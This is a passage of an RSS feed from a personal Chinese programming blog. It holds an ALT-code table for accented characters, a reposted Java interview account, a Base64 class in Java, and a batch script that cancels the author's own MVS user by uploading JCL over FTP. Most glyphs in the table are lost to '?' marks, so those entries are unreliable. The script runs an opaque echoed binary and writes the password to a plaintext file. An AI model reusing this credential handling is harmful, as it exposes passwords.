<td><b>?</b><br>        0218</td>          <td><b>?</b><br>        0221</td>        </tr>        <tr>          <th scope="row"  >Acute (Lower)</th>          <td><b>á</b><br>        0225</td>          <td><b>é</b><br>        0233</td>          <td><b>í</b><br>        0237</td>          <td><b>ó</b><br>        0243</td>          <td><b>ú</b><br>        0250</td>          <td><b>?</b><br>        0253</td>        </tr>        <tr>          <th scope="row"  >Circumflex<br>          <span>(Cap)</span></th>          <td><b>?</b><br>        0194</td>          <td><b>?</b><br>        0202</td>          <td><b>?</b><br>        0206</td>          <td><b>?</b><br>        0212</td>          <td><b>?</b><br>        0219</td>          <td>&nbsp;</td>        </tr>        <tr>          <th scope="row"  >Circumflex (Lower)</th>          <td><b>?</b><br>        0226</td>          <td><b>ê</b><br>        0234</td>          <td><b>?</b><br>        0238</td>          <td><b>?</b><br>        0244</td>          <td><b>?</b><br>        0251</td>          <td>&nbsp;</td>        </tr>        <tr>          <th scope="row"  >Tilde <br>          <span>(Cap)</span></th>          <td><b>?</b><br>        0195</td>          <td>--</td>          <td><b>?</b><br>        0209</td>          <td><b>?</b><br>        0213</td>          <td>-- </td>          <td>&nbsp;</td>        </tr>        <tr>          <th scope="row"  >Tilde (Lower)</th>          <td><b>?</b><br>        0227</td>          <td>--</td>          <td><b>?</b><br>        0241</td>          <td><b>?</b><br>        0245</td>          <td>-- </td>          <td>&nbsp;</td>        </tr>        <tr>          <th scope="row"  >Umlaut <span><br>        (Cap)</span></th>          <td><b>?</b><br>        0196</td>          <td><b>?</b><br>        0203</td>          <td><b>?</b><br>        0207</td>          <td><b>?</b><br>        0214</td>          <td><b>?</b> <br>        0220</td>          <td><b>?</b><br>        0159</td>        </tr>        <tr>          <th scope="row"  >Umlaut (Lower)</th>          <td><b>?</b><br>        0228</td>          <td><b>?</b><br>        0235</td>          <td><b>?</b><br>        0239</td>          <td><b>?</b><br>        0246</td>          <td><b>ü</b><br>        0252</td>          <td><b>?</b><br>        0255</td>        </tr>      </table>      <p>&nbsp;</p>      <p><b>Example: </b>To input the acute a <b>á</b> <b> (0225)</b>, hold         down the <b>ALT</b> key, type <b>0225 </b>on the numeric keypad, then release         the <b>ALT</b> key.</p>      <p>If you are having problems inputting these codes, please review the instructions         for <a rel="nofollow" href="http://tlt.its.psu.edu/suggestions/international/accents/codealt.html#using"  >using the codes</a> at the bottom of this Web page.</p>        <p> <a rel="nofollow" href="http://tlt.its.psu.edu/suggestions/international/accents/codealt.html#top"  >Top of Page</a></p>    <h2><a rel="nofollow"></a>Other Foreign Characters</h2>    <p>These include special punctuation and unique consonant and vowel symbols.</p>                 <table border="0"  cellpadding="5"  cellspacing="0"  >        <tbody><tr>          <th scope="col"  >SYMBOL</th>           <th scope="col"  >NAME</th>               <th scope="col"  >CO<wbr>DE NUMBER </th>        </tr>        <tr>           <td> ?</td>          <td width="40%"  >Upside-down exclamation mark</td>          <td align="center"  ><b>0161</b></td>        </tr>        <tr>           <td> ?</td>          <td>Upside-down question mark</td>          <td align="center"  ><b>0191</b></td>        </tr>        <tr>           <td> ?, ?</td>          <td>French C cedille (caps/lowecase)</td>          <td align="center"  ><b>0199</b><br>                  <b>0231</b></td>        </tr>        <tr>           <td> ?,?</td>          <td>O-E ligature (caps/lowecase)</td>          <td align="center"  ><b>0140</b><br>                  <b>0156</b></td>        </tr>        <tr>           <td> ?</td>          <td>German Sharp/Double S</td>          <td align="center"  ><b>0223</b></td>        </tr>        <tr>           <td> ?,?</td>          <td>Nordic O slash (caps/lowecase)</td>          <td align="center"  ><b>0216</b><br>                  <b>0248</b></td>        </tr>        <tr>           <td> ?,?</td>          <td>Nordic A ring (caps/lowecase), Angstrom sign</td>          <td align="center"  ><b>0197<br>          </b><b>0229</b></td>        </tr>        <tr>           <td> ?, ?</td>          <td>A-E ligature (caps/lowecase)</td>          <td align="center"  ><b>0198</b><br>                      <b>0230</b></td>        </tr>        <tr>          <td> ?, ?</td>           <td>Icelandic/Old English Thorn (caps/lowecase)<br>            <b>See <a rel="nofollow" href="http://tlt.its.psu.edu/suggestions/international/bylanguage/oegermanic.html"  >other Old English Characters </a></b></td>          <td align="center"  ><b>0222</b><br>                  <b>0254</b></td>        </tr>        <tr>          <td> ?, ?</td>           <td>Icelandic/Old English Eth (caps/lowecase)<br>            <b>See <a rel="nofollow" href="http://tlt.its.psu.edu/suggestions/international/bylanguage/oegermanic.html"  >other Old English Characters </a></b></td>          <td align="center"  ><b>0208</b><br>                      <b>0240</b></td>        </tr>        <tr>          <td>? ?</td>          <td>Spanish/French angle quotation marks</td>          <td align="center"  ><b>0171</b><br>              <b>0187</b></td>        </tr>        <tr>          <td>? ?</td>          <td>Spanish/French angle single quotation marks</td>          <td align="center"  ><b>0139</b><br>            <b>0155</b></td>        </tr>        <tr>          <td>? ?</td>          <td>Czech S hachek (S Caron) <br>            (caps/lowercase)<br>            <b>See <a rel="nofollow" href="http://tlt.its.psu.edu/suggestions/international/bylanguage/czechslovak.html"  >other Czech Characters</a></b><a rel="nofollow" href="http://tlt.its.psu.edu/suggestions/international/bylanguage/czechsolvak.html"  > </a></td>          <td align="center"  ><b>0138</b><br>              <b>0154</b></td>        </tr>        <tr>           <td> ? ?</td>          <td>Czech S hachek (Z Caron) <br>            (caps/lowercase)<br>            <b>See <a rel="nofollow" href="http://tlt.its.psu.edu/suggestions/international/bylanguage/czechslovak.html"  >other Czech Characters </a></b></td>          <td align="center"  ><b>0142</b><br>                      <b>0158</b></td>        </tr>    </table>    <p> <a rel="nofollow" href="http://tlt.its.psu.edu/suggestions/international/accents/codealt.html#top"  >Top of Page</a></p>      <h2><a rel="nofollow"></a>Currency Symbols</h2>           <table border="0"  cellpadding="5"  cellspacing="0"  >        <tbody><tr>          <th scope="col"  >SYMBOL</th>           <th scope="col"  >NAME</th>          <th scope="col"  >CO<wbr>DE NUMBER</th>        </tr>        <tr>           <td> ?</td>          <td width="40%"  >Cent sign</td>          <td align="center"  ><b>0162</b></td>        </tr>        <tr>           <td> ?</td>          <td>British Pound</td>          <td align="center"  ><b>0163</b></td>        </tr>        <tr>          <td> </td></tr></table>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>other</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/337319372009929102047159/</guid>
    </item>
    <item>
      <title>
<![CDATA[［转］CRL面试经历]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/3373193720078781543894/</link>
      <description>
<![CDATA[<div>这次面的是CRL的一个供应链研究组，职位是Java开发。在职位要求中还提到了Eclipse插件的开发技能（主要是EMF/GEF），所以
我估计他们可能是做一个类似于MDA的供应链工具。正好我简历中项目经历的第一条就是去年的MDA项目（嘿嘿），所以我想这大概是他们能叫我去面试的原因
吧。 </div>
<div>&nbsp;</div>
<div>6月6号上午10:30，在久经周折地来到了美丽的钻石大厦（CRL所在地）后，我的CRL面试旅程正式开始。这次同样是两个人面我，不过这回
是在一个非常宽敞的大会议室~&nbsp;
一开始先让我简单地做自我介绍，然后面试官（30岁左右，长得有点像孟岩...）参照我的简历，对我简历上的工作/实习经历提了一些基本问题，都是很开放
性的问题，自我发挥余地很大，如问我MDA的项目中我的职责，以及我们的实现方案（这点我早有准备~~）、对SOA的理解（也准备了~~hoho）、是否
熟悉EMF/GEF（我以前没用这东东作过项目，不过头一天看了一些相关资料，所以当时还是结合MDA的项目说了一些）等等</div>
<div>。</div>
<div>&nbsp;</div>
<div>然后问我是否熟悉 Struts， 我说还算比较熟，用它作过Web项目。于是让我在墙上的白版上画出 Struts 的体系结构。
我边画边做解释，同时留意地观察了两位面试管的表情，看他们是否可以理解我表达的东西。
幸运的是，那天我的思路还算比较清晰，画的图也比较容易理解。在就 Struts
对应的Web层说了有10分钟左右的时间后，其中一位面试管又继续在我画出的Web层的结构基础上，提出了一些Logic
层的问题。先是让我画出我以前的项目中是如何设计 Logic 层的，我简单的解释了一下我是如何设计实体Bean 和 Session
Bean的，以及 Web 层如何与 Session Bean交互等等。后来又问我如何实现实体Bean的持久化。 于是我的图继续延伸，引入到了
DB 层（DB这个东东我比较怕怕的...）。还好，这回CRL的面试对DB的东西好像不太感兴趣~&nbsp;
后来的问题主要集中在如何进行O/R的映射上。我说我以前用DAO对象来完成数据的存储操作，不过后来其中一位面试官又继续问了我一些DAO的计设问题，
这部分我对他们坦言没有很深入的研究过，只是很一般性的使用现成的框架。</div>
<div>&nbsp;</div>
<div>大概过了20分钟，折腾完这张 Web 系统的设计图后，他们开始问我一些 Java
程序的问题（嘿嘿，程序设计是偶的强项，即使问的不是最擅长的Cpp），如Java中的函数是传值还是传址啦，Java中的字符串缓存机制啦，序列化啦，
对HashMap的Key对象有何要求拉等等比较细节的问题。然后让我在白板上写一些 Java
的代码，包括访问、关闭数据库、异常处理、链表处理等等。这些东东自然是很简单的，我的回答及解释也令他们很满意。</div>
<div>&nbsp;</div>
<div>之后进入类的设计和UML的问题。问我假设有一个很庞大的接口，若我们去写一个类实现这个接口，那么势必要实现接口中所有的的方法，这种情况下
应该怎样处理比较好。
我回答说可以在接口和类之间加一个适配器，让该适配器实现（implement）接口，让类继承（extends）适配器，并举例说 AWT
中许多类就是这样做的。 后来他们让我解释了一些UML的符号，并给我一些类让我设计类图。
这些东东说实话很是我比较熟悉的，平时也经常有意识的训练过，所以发挥的还是很不错的，呵呵。 </div>
<div>&nbsp;</div>
<div>然后问我设计模式的问题，先是问我熟悉那些模式，我说了几个。然后问我 Abstract Factory
的是怎么个东东，能干什么事儿。&nbsp; 我把我能想到Abstract Factory
的设计思路都画了出来，解释了一番。同时和其中一个面试官就Abstract Factory
模式讨论半天，我说这种模式其实可以为许多设计带来启发，然后又在白板上比比划划了一番。当时讨论到这里的时候，我感觉气氛很好，一点没有面试的感觉，就
好像是在和学校的同学、老师一起讨论一样，很自在~~</div>
<div>&nbsp;</div>
<div>到这时面试时间已经持续了1个半小时了。最后谈了实习时间问题，我说我6月底就自由了，可以保证实习时间。 临走的时候我感觉心情很愉快，这次面试的感觉很好，不想是那种很有压力的面试，而且我也把我的思想顺利的表达了出来，很爽！:-)</div>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Mood</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/3373193720078781543894/</guid>
    </item>
    <item>
      <title>
<![CDATA[kick oneself from mvs with a bat]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/3373193720071127315778/</link>
      <description>
<![CDATA[<P>this is incredible, I get my user in mvs revoked for test.<BR>1.input userid, and convert it to upper case<BR>2.input password, with mode of no echo.<BR>3.generate a jcl to cancel user<BR>4.generate a ftp file to upload the jcl<BR>5.upload jcl<BR>6.delete files.</P>
<P><BR>@echo off <BR>@REM step1 input username and password<BR>set TempVBS="%temp%\MyUpCase.vbs"<BR>set /p in=Enter username: <BR>echo up=UCase("%in%")&gt;%TempVBS%<BR>echo wscript.echo up&gt;&gt;%TempVBS%<BR>set hjz=<BR>for /f "tokens=1* delims=" %%a in ('cscript /nologo %TempVBS%') do (<BR>&nbsp; set hjz=%hjz%%%a<BR>)<BR>set username=%hjz%<BR>echo hP1X500P[PZBBBfh#b##fXf-V@`$fPf]f3/f1/5++u5x&gt;in.com<BR>set /p password=Enter password:&lt;nul<BR>for /f "tokens=*" %%i in ('in.com') do set password=%%i<BR>del in.com<BR>echo.<BR>return</P>
<P>@REM step2 generate jcl<BR>echo //%username%C JOB&nbsp; CLASS=A,MSGCLASS=A,MSGLEVEL=(1,1),NOTIFY=%username%&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &gt;cancel<BR>echo //STEPA&nbsp;&nbsp;&nbsp; EXEC PGM=IEFBR14&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &gt;&gt;cancel<BR>echo // C U=CNTESTD&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &gt;&gt;cancel<BR>echo /*&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &gt;&gt;cancel</P>
<P>&nbsp;</P>
<P>@REM step3 generate .ftp<BR>echo open winmvs2c.hursley.ibm.com &gt; hankjin.ftp<BR>echo %username% &gt;&gt; hankjin.ftp<BR>echo %password% &gt;&gt; hankjin.ftp<BR>echo quote site file=jes&gt;&gt;hankjin.ftp<BR>echo put cancel&gt;&gt;hankjin.ftp<BR>@REM echo bye &gt;&gt; hankjin.ftp</P>
<P>@REM step4 upload <BR>ftp -s:hankjin.ftp</P>
<P>@REM step5 succeed<BR>del hankjin.ftp<BR>del cancel<BR>echo "Finished"<BR>pause</P>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>MVS</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/3373193720071127315778/</guid>
    </item>
    <item>
      <title>
<![CDATA[BASE64编码机制]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/3373193720078591132883/</link>
      <description>
<![CDATA[<P>BASE64的编码非常简单，byte是8位的，BASE64就是用64个常用字符来表示所有的字符，64由6位表示。</P>
<P>然后8*3=6*4，所以原来3x的信息用BASE64就要4x的存储空间。</P>
<P>这里有一个Java实现类，看了这个就完全明白了。</P>
<P>仔细看encode方法，decode方法就是反过来。</P>
<P>import java.lang.*;<BR>import java.io.*;<BR>&nbsp; <BR>public class CLSBase64 {<BR>&nbsp;public static void main(String args[]){<BR>&nbsp;&nbsp;test();<BR>&nbsp;&nbsp;System.out.println((int)'=');<BR>&nbsp;}<BR>&nbsp;public static void test(){<BR>&nbsp;&nbsp;for(int i = 1; i &lt;=&nbsp; 16*8; i ++){<BR>&nbsp;&nbsp;&nbsp;System.out.print(i+":"+(char)i+"\t");<BR>&nbsp;&nbsp;&nbsp;if(i % 8 == 0){<BR>&nbsp;&nbsp;&nbsp;&nbsp;System.out.println(); <BR>&nbsp;&nbsp;&nbsp;}<BR>&nbsp;&nbsp;}<BR>&nbsp;}<BR>&nbsp;private static char[] base64EncodeChars = new char[] {<BR>&nbsp;&nbsp;&nbsp;'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H',<BR>&nbsp;&nbsp;&nbsp;'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P',<BR>&nbsp;&nbsp;&nbsp;'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X',<BR>&nbsp;&nbsp;&nbsp;'Y', 'Z', 'a', 'b', 'c', 'd', 'e', 'f',<BR>&nbsp;&nbsp;&nbsp;'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n',<BR>&nbsp;&nbsp;&nbsp;'o', 'p', 'q', 'r', 's', 't', 'u', 'v',<BR>&nbsp;&nbsp;&nbsp;'w', 'x', 'y', 'z', '0', '1', '2', '3',<BR>&nbsp;&nbsp;&nbsp;'4', '5', '6', '7', '8', '9', '+', '/' };<BR>&nbsp;private static byte[] base64DecodeChars = new byte[] {<BR>&nbsp;&nbsp;&nbsp;-1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1,<BR>&nbsp;&nbsp;&nbsp;-1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1,<BR>&nbsp;&nbsp;&nbsp;-1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, 62, -1, -1, -1, 63,<BR>&nbsp;&nbsp;&nbsp;52, 53, 54, 55, 56, 57, 58, 59, 60, 61, -1, -1, -1, -1, -1, -1,<BR>&nbsp;&nbsp;&nbsp;-1,&nbsp; 0,&nbsp; 1,&nbsp; 2,&nbsp; 3,&nbsp; 4,&nbsp; 5,&nbsp; 6,&nbsp; 7,&nbsp; 8,&nbsp; 9, 10, 11, 12, 13, 14,<BR>&nbsp;&nbsp;&nbsp;15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, -1, -1, -1, -1, -1,<BR>&nbsp;&nbsp;&nbsp;-1, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40,<BR>&nbsp;&nbsp;&nbsp;41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, -1, -1, -1, -1, -1 };</P>
<P>&nbsp;//解码<BR>&nbsp;public static byte[] decode(String str) throws UnsupportedEncodingException {<BR>&nbsp;&nbsp;StringBuffer sb = new StringBuffer();<BR>&nbsp;&nbsp;byte[] data = str.getBytes("US-ASCII");<BR>&nbsp;&nbsp;int len = data.length;<BR>&nbsp;&nbsp;int i = 0;<BR>&nbsp;&nbsp;int b1, b2, b3, b4;<BR>&nbsp;&nbsp;while (i &lt; len) {<BR>&nbsp;&nbsp;&nbsp;/* b1 */<BR>&nbsp;&nbsp;&nbsp;do {<BR>&nbsp;&nbsp;&nbsp;&nbsp;b1 = base64DecodeChars[data[i++]];<BR>&nbsp;&nbsp;&nbsp;} while (i &lt; len &amp;&amp; b1 == -1);<BR>&nbsp;&nbsp;&nbsp;if (b1 == -1) <BR>&nbsp;&nbsp;&nbsp;&nbsp;break;<BR>&nbsp;&nbsp;&nbsp;/* b2 */<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; do {<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; b2 = base64DecodeChars[data[i++]];<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; } while (i &lt; len &amp;&amp; b2 == -1);<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if (b2 == -1) <BR>&nbsp;&nbsp;&nbsp;&nbsp; break;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; sb.append((char)((b1 &lt;&lt; 2) | ((b2 &amp; 0x30) &gt;&gt;&gt; 4)));<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /* b3 */<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; do {<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; b3 = data[i++];<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if (b3 == 61) <BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return sb.toString().getBytes("ISO-8859-1");<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; b3 = base64DecodeChars[b3];<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; } while (i &lt; len &amp;&amp; b3 == -1);<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if (b3 == -1) <BR>&nbsp;&nbsp;&nbsp;&nbsp; break;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; sb.append((char)(((b2 &amp; 0x0f) &lt;&lt; 4) | ((b3 &amp; 0x3c) &gt;&gt;&gt; 2)));<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /* b4 */<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; do {<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; b4 = data[i++];<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if (b4 == 61) <BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return sb.toString().getBytes("ISO-8859-1");<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; b4 = base64DecodeChars[b4];<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; } while (i &lt; len &amp;&amp; b4 == -1);<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if (b4 == -1) <BR>&nbsp;&nbsp;&nbsp;&nbsp; break;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; sb.append((char)(((b3 &amp; 0x03) &lt;&lt; 6) | b4));<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return sb.toString().getBytes("ISO-8859-1");<BR>&nbsp;&nbsp;&nbsp;&nbsp; }<BR>&nbsp; <BR>&nbsp;&nbsp;&nbsp;&nbsp; //编码<BR>&nbsp;&nbsp;&nbsp;&nbsp; public static String encode(byte[] data) {<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; StringBuffer sb = new StringBuffer();<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; int len = data.length;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; int i = 0;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; int b1, b2, b3;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; while (i &lt; len) {<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; b1 = data[i++] &amp; 0xff;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if (i == len)<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; sb.append(base64EncodeChars[b1 &gt;&gt;&gt; 2]);<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; sb.append(base64EncodeChars[(b1 &amp; 0x3) &lt;&lt; 4]);<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; sb.append("==");<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; break;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; b2 = data[i++] &amp; 0xff;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if (i == len)<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; sb.append(base64EncodeChars[b1 &gt;&gt;&gt; 2]);<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; sb.append(base64EncodeChars[((b1 &amp; 0x03) &lt;&lt; 4) | ((b2 &amp; 0xf0) &gt;&gt;&gt; 4)]);<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; sb.append(base64EncodeChars[(b2 &amp; 0x0f) &lt;&lt; 2]);<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; sb.append("=");<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; break;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; b3 = data[i++] &amp; 0xff;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; sb.append(base64EncodeChars[b1 &gt;&gt;&gt; 2]);<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; sb.append(base64EncodeChars[((b1 &amp; 0x03) &lt;&lt; 4) | ((b2 &amp; 0xf0) &gt;&gt;&gt; 4)]);<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; sb.append(base64EncodeChars[((b2 &amp; 0x0f) &lt;&lt; 2) | ((b3 &amp; 0xc0) &gt;&gt;&gt; 6)]);<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; sb.append(base64EncodeChars[b3 &amp; 0x3f]);<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return sb.toString();<BR>&nbsp;&nbsp;&nbsp;&nbsp; }<BR>&nbsp;}</P>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>J2SE</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/3373193720078591132883/</guid>
    </item>
    <item>
      <title>
<![CDATA[都有哪些电子邮箱]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/337319372010102683928712/</link>
      <description>
